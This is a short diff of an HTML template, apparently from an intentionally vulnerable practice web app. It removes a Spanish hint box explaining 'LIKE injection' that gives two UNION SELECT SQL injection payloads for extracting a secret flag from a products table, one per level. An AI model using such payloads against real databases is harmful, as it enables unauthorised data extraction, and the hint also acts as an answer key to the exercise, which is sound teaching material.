@@ -39,13 +39,5 @@
   </div>
 </div>
 
-<div class="hint-box mt-3">
-  <div class="hint-title">técnica: LIKE injection</div>
-  <p>
-    Query: <code>SELECT ... FROM products WHERE name LIKE '%[search]%'</code><br>
-    Cierra el LIKE con: <code>%' UNION SELECT 1,secret_flag,description,price FROM products WHERE id=9--</code><br>
-    Para nivel 2: <code>?limit=5 UNION SELECT 1,secret_flag,description,price FROM products WHERE id=10--</code>
-  </p>
-</div>
 
 {% endblock %}
